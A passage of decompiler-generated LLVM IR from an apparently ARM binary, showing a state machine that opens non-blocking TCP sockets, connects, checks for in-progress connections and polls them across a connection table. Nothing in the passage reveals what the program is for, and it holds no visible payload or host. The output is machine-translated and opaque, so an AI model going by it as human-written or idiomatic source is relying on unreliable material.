  %v2_b1b0 = inttoptr i32 %v1_b1a8 to i32*
  store i32 0, i32* %v2_b1b0, align 4
  %v0_b1b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b1b4 = add i32 %v0_b1b4, 4
  %v2_b1bc = inttoptr i32 %v1_b1b4 to i32*
  store i32 0, i32* %v2_b1bc, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  %v2_b1dc = add i32 %v2_b0a0, 20
  store i32 %v2_b1dc, i32* %r2.global-to-local, align 4
  store i32 %v2_b15c, i32* %r3.global-to-local, align 4
  %v2_b1e4 = inttoptr i32 %v2_b1dc to i32*
  store i32 %v2_b15c, i32* %v2_b1e4, align 4
  store i32 %storemerge560, i32* @r4, align 4
  %v5_b1ec = call i32 @function_a790(i32 20, i32 %v3_af84, i32 %v2_b1dc, i32 %v2_b15c, i32 %v2_b15c)
  store i32 %v5_b1ec, i32* %r1.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_b1fc = load i32, i32* @r4, align 4
  %v3_b200 = mul i32 %v0_b1fc, 8
  store i32 %v3_b200, i32* %r2.global-to-local, align 4
  %v2_b208 = mul i32 %v0_b1fc, 24
  %v2_b210 = add i32 %v2_b3d0, %v2_b208
  store i32 %v2_b210, i32* %r3.global-to-local, align 4
  %v2_b214 = inttoptr i32 %v2_b210 to i32*
  store i32 %v5_b1ec, i32* %v2_b214, align 4
  br label %dec_label_pc_b378

dec_label_pc_b21c:                                ; preds = %dec_label_pc_b0dc
  store i32 %storemerge560, i32* %r1.global-to-local, align 4
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a4, i32* %r3.global-to-local, align 4
  %v1_b240 = add i32 %v2_b0a0, 11
  %v2_b240 = inttoptr i32 %v1_b240 to i8*
  %v3_b240 = load i8, i8* %v2_b240, align 1
  %v1_b244 = add i8 %v3_b240, 1
  store i32 %v3_af84, i32* %ip.global-to-local, align 4
  store i32 8, i32* @lr, align 4
  store i8 %v1_b244, i8* %v2_b240, align 1
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a4, i32* %r3.global-to-local, align 4
  %v3_b294 = load i8, i8* %v2_b240, align 1
  %v4_b294 = zext i8 %v3_b294 to i32
  store i32 %v4_b294, i32* %r3.global-to-local, align 4
  %v7_b298 = icmp eq i8 %v3_b294, 10
  br i1 %v7_b298, label %dec_label_pc_b2a0, label %dec_label_pc_b21c.dec_label_pc_b320_crit_edge

dec_label_pc_b21c.dec_label_pc_b320_crit_edge:    ; preds = %dec_label_pc_b21c
  %.pre70 = add i32 %v2_b0a0, 10
  %.pre71 = inttoptr i32 %.pre70 to i8*
  br label %dec_label_pc_b320

dec_label_pc_b2a0:                                ; preds = %dec_label_pc_b21c
  store i8 0, i8* %v2_b240, align 1
  store i32 %storemerge560, i32* %r1.global-to-local, align 4
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a4, i32* %r3.global-to-local, align 4
  %v1_b2ec = add i32 %v2_b0a0, 10
  %v2_b2ec = inttoptr i32 %v1_b2ec to i8*
  %v3_b2ec = load i8, i8* %v2_b2ec, align 2
  %v4_b2ec = zext i8 %v3_b2ec to i32
  %v1_b2f0 = add nuw nsw i32 %v4_b2ec, 1
  %v1_b2f4 = urem i32 %v1_b2f0, 256
  store i32 %v3_af84, i32* %ip.global-to-local, align 4
  store i32 8, i32* @lr, align 4
  store i32 %v2_b0a4, i32* %r2.global-to-local, align 4
  store i32 %v1_b2f4, i32* %r3.global-to-local, align 4
  %v1_b31c = trunc i32 %v1_b2f0 to i8
  store i8 %v1_b31c, i8* %v2_b2ec, align 2
  br label %dec_label_pc_b320

dec_label_pc_b320:                                ; preds = %dec_label_pc_b21c.dec_label_pc_b320_crit_edge, %dec_label_pc_b2a0
  %v2_b340.pre-phi = phi i8* [ %.pre71, %dec_label_pc_b21c.dec_label_pc_b320_crit_edge ], [ %v2_b2ec, %dec_label_pc_b2a0 ]
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a4, i32* %r3.global-to-local, align 4
  %v3_b340 = load i8, i8* %v2_b340.pre-phi, align 2
  %v4_b340 = zext i8 %v3_b340 to i32
  store i32 %v4_b340, i32* %r3.global-to-local, align 4
  %v7_b344 = icmp eq i8 %v3_b340, 3
  br i1 %v7_b344, label %dec_label_pc_b34c, label %dec_label_pc_b320.dec_label_pc_b378_crit_edge

dec_label_pc_b320.dec_label_pc_b378_crit_edge:    ; preds = %dec_label_pc_b320
  %.pre = inttoptr i32 %v2_b0a0 to i32*
  br label %dec_label_pc_b378

dec_label_pc_b34c:                                ; preds = %dec_label_pc_b320
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v2_b0a4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_b130, align 1
  br label %dec_label_pc_ce80

dec_label_pc_b378:                                ; preds = %dec_label_pc_b320.dec_label_pc_b378_crit_edge, %dec_label_pc_b13c
  %v1_b428.pre-phi = phi i32* [ %.pre, %dec_label_pc_b320.dec_label_pc_b378_crit_edge ], [ %v2_b180, %dec_label_pc_b13c ]
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-212, align 4
  %v1_b38c = call i32 @function_12434(i32 23)
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  %v2_b3d4 = add i32 %v2_b3d0, %v2_b09c
  store i32 %v2_b3d4, i32* %r3.global-to-local, align 4
  %v1_b3d8 = inttoptr i32 %v2_b3d4 to i32*
  %v2_b3d8 = load i32, i32* %v1_b3d8, align 4
  store i32 %v2_b3d8, i32* %r3.global-to-local, align 4
  store i32 %storemerge560, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b3f0 = call i32 @function_1263c(i32 2, i32 1, i32 0)
  %v0_b3f8 = load i32, i32* @r4, align 4
  %v2_b404 = mul i32 %v0_b3f8, 24
  %v2_b408 = add i32 %v2_b404, %v3_af84
  %v2_b40c = inttoptr i32 %v2_b408 to i32*
  store i32 %v3_b3f0, i32* %v2_b40c, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v2_b428 = load i32, i32* %v1_b428.pre-phi, align 4
  store i32 %v2_b428, i32* %r3.global-to-local, align 4
  %v7_b42c = icmp eq i32 %v2_b428, -1
  br i1 %v7_b42c, label %dec_label_pc_ce80, label %dec_label_pc_b434

dec_label_pc_b434:                                ; preds = %dec_label_pc_b378
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v2_b44c = load i32, i32* %v1_b428.pre-phi, align 4
  store i32 %v2_b44c, i32* @r4, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v2_b468 = load i32, i32* %v1_b428.pre-phi, align 4
  store i32 %v2_b468, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b478 = call i32 @function_10560(i32 %v2_b468, i32 3)
  %v1_b480 = or i32 %v2_b478, 2048
  store i32 %v1_b480, i32* %r3.global-to-local, align 4
  %v0_b484 = load i32, i32* @r4, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %v1_b480, i32* @r2, align 4
  %v2_b490 = call i32 @function_10560(i32 %v0_b484, i32 4)
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v2_b4ac = load i32, i32* %v1_b428.pre-phi, align 4
  store i32 %v2_b4ac, i32* %r3.global-to-local, align 4
  store i32 %v2_af38, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_b4c0 = call i32 @function_124f8(i32 %v2_b4ac, %sockaddr* nonnull %v3_b4c0, i32 16)
  store i32 %v4_b4c0, i32* %r3.global-to-local, align 4
  %v3_b4c8 = icmp eq i32 %v4_b4c0, -1
  br i1 %v3_b4c8, label %dec_label_pc_b4d0, label %dec_label_pc_b534

dec_label_pc_b4d0:                                ; preds = %dec_label_pc_b434
  %v0_b4d0 = call i32 @function_10a18()
  store i32 %v0_b4d0, i32* %r3.global-to-local, align 4
  %v1_b4d8 = inttoptr i32 %v0_b4d0 to i32*
  %v2_b4d8 = load i32, i32* %v1_b4d8, align 4
  store i32 %v2_b4d8, i32* %r3.global-to-local, align 4
  %v7_b4dc = icmp eq i32 %v2_b4d8, 115
  br i1 %v7_b4dc, label %dec_label_pc_b534, label %dec_label_pc_b4e4

dec_label_pc_b4e4:                                ; preds = %dec_label_pc_b4d0
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v2_b4fc = load i32, i32* %v1_b428.pre-phi, align 4
  store i32 %v2_b4fc, i32* %r3.global-to-local, align 4
  %v3_b504 = call i32 @function_ae78(i32 %v2_b4fc, i32 %v3_af84, i32 %v3_b094)
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v2_b0a4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_b130, align 1
  br label %dec_label_pc_ce80

dec_label_pc_b534:                                ; preds = %dec_label_pc_b434, %dec_label_pc_b4d0
  store i8 1, i8* %v1_b0a8, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  %v2_b578 = add i32 %v2_b0a0, 12
  store i32 %v2_b578, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b580 = inttoptr i32 %v2_b578 to i32*
  store i32 0, i32* %v2_b580, align 4
  br label %dec_label_pc_ce80

dec_label_pc_b588:                                ; preds = %dec_label_pc_b088
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  %v2_b5a4 = add i32 %v2_b09c, %v2_b5a0
  store i32 %v2_b5a4, i32* %r3.global-to-local, align 4
  %v1_b5a8 = inttoptr i32 %v2_b5a4 to i32*
  %v2_b5a8 = load i32, i32* %v1_b5a8, align 4
  store i32 %v2_b5a8, i32* %r3.global-to-local, align 4
  %v2_b5ac = icmp eq i32 %v2_b5a8, 0
  br i1 %v2_b5ac, label %dec_label_pc_b5b4, label %dec_label_pc_b600.lr.ph

dec_label_pc_b5b4:                                ; preds = %dec_label_pc_b588
  store i32 %storemerge560, i32* @r4, align 4
  %v2_b5bc = call i32 @function_1096c(i32* null)
  store i32 %v2_b5bc, i32* %r1.global-to-local, align 4
  store i32 12, i32* %ip.global-to-local, align 4
  %v0_b5d0 = load i32, i32* @r4, align 4
  %v3_b5d4 = mul i32 %v0_b5d0, 8
  store i32 %v3_b5d4, i32* %r2.global-to-local, align 4
  %v2_b5dc = mul i32 %v0_b5d0, 24
  %v2_b5e4 = add i32 %v2_b5a0, %v2_b5dc
  store i32 %v2_b5e4, i32* %r3.global-to-local, align 4
  %v2_b5e8 = inttoptr i32 %v2_b5e4 to i32*
  store i32 %v2_b5bc, i32* %v2_b5e8, align 4
  br label %dec_label_pc_b600.lr.ph

dec_label_pc_b600.lr.ph:                          ; preds = %dec_label_pc_b5b4, %dec_label_pc_b588
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b600

dec_label_pc_b600:                                ; preds = %dec_label_pc_b600.lr.ph, %dec_label_pc_b600
  %storemerge610 = phi i32 [ 0, %dec_label_pc_b600.lr.ph ], [ %v1_b614, %dec_label_pc_b600 ]
  store i32 %storemerge610, i32* %r1.global-to-local, align 4
  store i32 %v2_b5ec, i32* %r2.global-to-local, align 4
  %v5_b60c = mul nuw nsw i32 %storemerge610, 4
  %v6_b60c = add i32 %v5_b60c, %v2_b5ec
  %v7_b60c = inttoptr i32 %v6_b60c to i32*
  store i32 0, i32* %v7_b60c, align 4
  %v1_b614 = add nuw nsw i32 %storemerge610, 1
  store i32 %v1_b614, i32* %r3.global-to-local, align 4
  %tmp47 = icmp ult i32 %v1_b614, 32
  br i1 %tmp47, label %dec_label_pc_b600, label %dec_label_pc_b628

dec_label_pc_b628:                                ; preds = %dec_label_pc_b600
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v1_b640 = inttoptr i32 %v2_b0a0 to i32*
  %v2_b640 = load i32, i32* %v1_b640, align 4
  %v3_b644 = udiv i32 %v2_b640, 32
  store i32 -156, i32* %r2.global-to-local, align 4
  %v3_b650 = mul nuw nsw i32 %v3_b644, 4
  store i32 %v19_aec8, i32* %r1.global-to-local, align 4
  %v2_b65c = add i32 %v2_b658, %v3_b650
  store i32 %v2_b65c, i32* %r3.global-to-local, align 4
  %v1_b660 = inttoptr i32 %v2_b65c to i32*
  %v2_b660 = load i32, i32* %v1_b660, align 4
  store i32 %v2_b660, i32* %ip.global-to-local, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v2_b67c = load i32, i32* %v1_b640, align 4
  %v1_b680 = urem i32 %v2_b67c, 32
  %v6_b688 = shl i32 1, %v1_b680
  %v2_b68c = or i32 %v6_b688, %v2_b660
  store i32 %v2_b68c, i32* %v1_b660, align 4
  store i32 0, i32* %stack_var_-188, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v2_b6d4 = load i32, i32* %v1_b640, align 4
  %v1_b6d8 = add i32 %v2_b6d4, 1
  store i32 %v1_b6d8, i32* %r2.global-to-local, align 4
  store i32 %v2_b5ec, i32* %ip.global-to-local, align 4
  %v1_b6e4 = load i32, i32* @sp, align 4
  %v2_b6e4 = inttoptr i32 %v1_b6e4 to i32*
  store i32 %v2_b6e0, i32* %v2_b6e4, align 4
  %v0_b6e8 = load i32, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_b5ec, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_b6f8 = load i32, i32* %stack_var_-188, align 4
  %v5_b6f8 = call i32 @function_108bc(i32 %v0_b6e8, i32 0, i32 %v2_b5ec, i32 0, i32 %v4_b6f8)
  store i32 %v5_b6f8, i32* %r3.global-to-local, align 4
  %v7_b708 = icmp eq i32 %v5_b6f8, 1
  br i1 %v7_b708, label %dec_label_pc_b710, label %dec_label_pc_b8f4

dec_label_pc_b710:                                ; preds = %dec_label_pc_b628
  store i32 4, i32* %stack_var_-192, align 4
  store i32 0, i32* %stack_var_-196, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v2_b738 = load i32, i32* %v1_b640, align 4
  store i32 %v2_b738, i32* %r2.global-to-local, align 4
  store i32 %v2_b73c, i32* %ip.global-to-local, align 4
  %v1_b744 = load i32, i32* @sp, align 4
  %v2_b744 = inttoptr i32 %v1_b744 to i32*
  store i32 %v2_b740, i32* %v2_b744, align 4
  %v0_b748 = load i32, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 %v2_b73c, i32* %r3.global-to-local, align 4
  %v4_b758 = load i32, i32* %stack_var_-196, align 4
  %v6_b758 = call i32 @function_12550(i32 %v0_b748, i32 1, i32 4, i32* nonnull %stack_var_-196, i32 %v4_b758)
  %v3_b75c = load i32, i32* %stack_var_-196, align 4
  %v2_b760 = icmp eq i32 %v3_b75c, 0
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v2_b7f8 = load i32, i32* %v1_b640, align 4
  br i1 %v2_b760, label %dec_label_pc_b7e0, label %dec_label_pc_b768

dec_label_pc_b768:                                ; preds = %dec_label_pc_b710
  store i32 %v2_b7f8, i32* %r3.global-to-local, align 4
  %v3_b788 = call i32 @function_ae78(i32 %v2_b7f8, i32 %v3_af84, i32 %v3_b094)
  store i8 0, i8* %v1_b0a8, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v2_b0a4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_b7d8 = add i32 %v2_b0a0, 9
  %v4_b7d8 = inttoptr i32 %v3_b7d8 to i8*
  store i8 1, i8* %v4_b7d8, align 1
  br label %dec_label_pc_b974

dec_label_pc_b7e0:                                ; preds = %dec_label_pc_b710
  store i32 %v2_b7f8, i32* @r4, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v2_b814 = load i32, i32* %v1_b640, align 4
  store i32 %v2_b814, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b824 = call i32 @function_10560(i32 %v2_b814, i32 3)
  %v1_b82c = and i32 %v2_b824, -2049
  store i32 %v1_b82c, i32* %r3.global-to-local, align 4
  %v0_b830 = load i32, i32* @r4, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %v1_b82c, i32* @r2, align 4
  %v2_b83c = call i32 @function_10560(i32 %v0_b830, i32 4)
  %v2_b85c = add i32 %v2_b0a0, 12
  %v2_b864 = inttoptr i32 %v2_b85c to i32*
  store i32 0, i32* %v2_b864, align 4
  %v2_b884 = add i32 %v2_b0a0, 16
  store i32 %v2_b884, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b88c = inttoptr i32 %v2_b884 to i8*
  store i8 0, i8* %v3_b88c, align 4
  %v0_b890 = load i32, i32* %r3.global-to-local, align 4
  %v1_b890 = trunc i32 %v0_b890 to i8
  %v2_b890 = load i32, i32* %r2.global-to-local, align 4
  %v3_b890 = add i32 %v2_b890, 1
  %v4_b890 = inttoptr i32 %v3_b890 to i8*
  store i8 %v1_b890, i8* %v4_b890, align 1
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  %v2_b8b0 = add i32 %v2_b09c, %v2_b044
  store i32 %v2_b8b0, i32* %r3.global-to-local, align 4
  %v1_b8b4 = inttoptr i32 %v2_b8b0 to i32*
  %v2_b8b4 = load i32, i32* %v1_b8b4, align 4
  store i32 %v2_b8b4, i32* %r3.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_b8c4 = inttoptr i32 %v2_b8b4 to i8*
  %v3_b8c4 = call i32 @function_11d70(i8* %v2_b8c4, i32 0)
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v2_b0a4, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i8 2, i8* %v1_b0a8, align 4
  br label %dec_label_pc_ce80

dec_label_pc_b8f4:                                ; preds = %dec_label_pc_b628
  store i32 %v5_b6f8, i32* %r3.global-to-local, align 4
  %v3_b8f8 = icmp eq i32 %v5_b6f8, -1
  br i1 %v3_b8f8, label %dec_label_pc_b900, label %dec_label_pc_b974

dec_label_pc_b900:                                ; preds = %dec_label_pc_b8f4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v2_b918 = load i32, i32* %v1_b640, align 4
  store i32 %v2_b918, i32* %r3.global-to-local, align 4
  %v3_b920 = call i32 @function_ae78(i32 %v2_b918, i32 %v3_af84, i32 %v3_b094)
  store i8 0, i8* %v1_b0a8, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v2_b0a4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_b970 = add i32 %v2_b0a0, 9
  %v4_b970 = inttoptr i32 %v3_b970 to i8*
  store i8 1, i8* %v4_b970, align 1
  br label %dec_label_pc_b974

dec_label_pc_b974:                                ; preds = %dec_label_pc_b8f4, %dec_label_pc_b768, %dec_label_pc_b900
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b5a4, i32* %r3.global-to-local, align 4
  %v2_b994 = load i32, i32* %v1_b5a8, align 4
  store i32 %v2_b994, i32* %r3.global-to-local, align 4
  %v1_b998 = add i32 %v2_b994, 10
  store i32 %v1_b998, i32* @r4, align 4
  %v2_b9a0 = call i32 @function_1096c(i32* null)
  store i32 %v2_b9a0, i32* %r3.global-to-local, align 4
  %v0_b9a8 = load i32, i32* @r4, align 4
  %v3_b9a8 = icmp ult i32 %v0_b9a8, %v2_b9a0
  br i1 %v3_b9a8, label %dec_label_pc_b9b0, label %dec_label_pc_ce80

dec_label_pc_b9b0:                                ; preds = %dec_label_pc_b974
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v2_b9c8 = load i32, i32* %v1_b640, align 4
  store i32 %v2_b9c8, i32* %r3.global-to-local, align 4
  %v3_b9d0 = call i32 @function_ae78(i32 %v2_b9c8, i32 %v3_af84, i32 %v3_b094)
  store i8 0, i8* %v1_b0a8, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v2_b0a4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_ba20 = add i32 %v2_b0a0, 9
  %v4_ba20 = inttoptr i32 %v3_ba20 to i8*
  store i8 1, i8* %v4_ba20, align 1
  br label %dec_label_pc_ce80

dec_label_pc_ba28:                                ; preds = %dec_label_pc_b088
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  %v2_ba44 = add i32 %v2_b09c, %v2_b5a0
  store i32 %v2_ba44, i32* %r3.global-to-local, align 4
  %v1_ba48 = inttoptr i32 %v2_ba44 to i32*
  %v2_ba48 = load i32, i32* %v1_ba48, align 4
  store i32 %v2_ba48, i32* %r3.global-to-local, align 4
  %v2_ba4c = icmp eq i32 %v2_ba48, 0
  br i1 %v2_ba4c, label %dec_label_pc_ba54, label %dec_label_pc_ba8c

dec_label_pc_ba54:                                ; preds = %dec_label_pc_ba28
  store i32 %storemerge560, i32* @r4, align 4
  %v2_ba5c = call i32 @function_1096c(i32* null)
  store i32 %v2_ba5c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %ip.global-to-local, align 4
  %v0_ba70 = load i32, i32* @r4, align 4
  %v3_ba74 = mul i32 %v0_ba70, 8
  store i32 %v3_ba74, i32* %r2.global-to-local, align 4
  %v2_ba7c = mul i32 %v0_ba70, 24
  %v2_ba84 = add i32 %v2_b5a0, %v2_ba7c
  store i32 %v2_ba84, i32* %r3.global-to-local, align 4
  %v2_ba88 = inttoptr i32 %v2_ba84 to i32*
  store i32 %v2_ba5c, i32* %v2_ba88, align 4
  br label %dec_label_pc_ba8c

dec_label_pc_ba8c:                                ; preds = %dec_label_pc_ba28, %dec_label_pc_ba54
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  %v2_baa8 = add i32 %v2_b09c, %v2_b044
  store i32 %v2_baa8, i32* %r3.global-to-local, align 4
  %v1_baac = inttoptr i32 %v2_baa8 to i32*
  %v2_baac = load i32, i32* %v1_baac, align 4
  store i32 %v2_baac, i32* %r3.global-to-local, align 4
  %v1_bab4 = call i32 @function_a37c(i32 %v2_baac)
  store i32 %v1_bab4, i32* %r3.global-to-local, align 4
  %v2_babc = icmp eq i32 %v1_bab4, 0
  br i1 %v2_babc, label %dec_label_pc_baec, label %dec_label_pc_bac4

dec_label_pc_bac4:                                ; preds = %dec_label_pc_ba8c
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v2_b0a4, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i8 8, i8* %v1_b0a8, align 4
  br label %dec_label_pc_baec

dec_label_pc_baec:                                ; preds = %dec_label_pc_ba8c, %dec_label_pc_bac4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v1_bb04 = inttoptr i32 %v2_b0a0 to i32*
  %v2_bb04 = load i32, i32* %v1_bb04, align 4
  store i32 %v2_bb04, i32* %ip.global-to-local, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_baa8, i32* %r3.global-to-local, align 4
  %v2_bb28 = load i32, i32* %v1_baac, align 4
  store i32 %v2_bb28, i32* @lr, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  %v2_bb48 = add i32 %v2_b0a0, 16
  store i32 %v2_bb48, i32* %r3.global-to-local, align 4
  %v1_bb4c = inttoptr i32 %v2_bb48 to i8*
  %v2_bb4c = load i8, i8* %v1_bb4c, align 4
  %v3_bb4c = zext i8 %v2_bb4c to i32
  store i32 %v3_bb4c, i32* %r2.global-to-local, align 4
  %v1_bb50 = add i32 %v2_b0a0, 17
  %v2_bb50 = inttoptr i32 %v1_bb50 to i8*
  %v3_bb50 = load i8, i8* %v2_bb50, align 1
  %v4_bb50 = zext i8 %v3_bb50 to i32
  %v4_bb54 = mul nuw nsw i32 %v4_bb50, 256
  %v5_bb54 = or i32 %v4_bb54, %v3_bb4c
  store i32 %v5_bb54, i32* %r2.global-to-local, align 4
  %v1_bb64 = load i32, i32* @sp, align 4
  %v2_bb64 = inttoptr i32 %v1_bb64 to i32*
  store i32 10000, i32* %v2_bb64, align 4
  %v0_bb68 = load i32, i32* @lr, align 4
  %v1_bb68 = load i32, i32* @sp, align 4
  %v2_bb68 = add i32 %v1_bb68, 4
  %v3_bb68 = inttoptr i32 %v2_bb68 to i32*
  store i32 %v0_bb68, i32* %v3_bb68, align 4
  %v1_bb70 = load i32, i32* @sp, align 4
  %v2_bb70 = add i32 %v1_bb70, 8
  %v3_bb70 = inttoptr i32 %v2_bb70 to i32*
  store i32 1024, i32* %v3_bb70, align 4
  %v0_bb74 = load i32, i32* %r2.global-to-local, align 4
  %v1_bb74 = load i32, i32* @sp, align 4
  %v2_bb74 = add i32 %v1_bb74, 12
  %v3_bb74 = inttoptr i32 %v2_bb74 to i32*
  store i32 %v0_bb74, i32* %v3_bb74, align 4
  %v0_bb78 = load i32, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_16d5c.78 to i32), i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_bb88 = call i32 @function_a4ec(i32 %v0_bb78, i32 ptrtoint ([6 x i8]* @global_var_16d5c.78 to i32), i32 0, i32 0)
  store i32 %v5_bb88, i32* %r3.global-to-local, align 4
  %v2_bb90 = icmp eq i32 %v5_bb88, 0
  br i1 %v2_bb90, label %dec_label_pc_bc4c, label %dec_label_pc_bb98

dec_label_pc_bb98:                                ; preds = %dec_label_pc_baec
  %v2_bbb4 = add i32 %v2_b0a0, 12
  %v2_bbbc = inttoptr i32 %v2_bbb4 to i32*
  store i32 0, i32* %v2_bbbc, align 4
  store i32 %v2_bb48, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v1_bb4c, align 4
  %v0_bbe8 = load i32, i32* %r3.global-to-local, align 4
  %v1_bbe8 = trunc i32 %v0_bbe8 to i8
  %v2_bbe8 = load i32, i32* %r2.global-to-local, align 4
  %v3_bbe8 = add i32 %v2_bbe8, 1
  %v4_bbe8 = inttoptr i32 %v3_bbe8 to i8*
  store i8 %v1_bbe8, i8* %v4_bbe8, align 1
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_baa8, i32* %r3.global-to-local, align 4
  %v2_bc0c = load i32, i32* %v1_baac, align 4
  store i32 %v2_bc0c, i32* %r3.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_bc1c = inttoptr i32 %v2_bc0c to i8*
  %v3_bc1c = call i32 @function_11d70(i8* %v2_bc1c, i32 0)
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
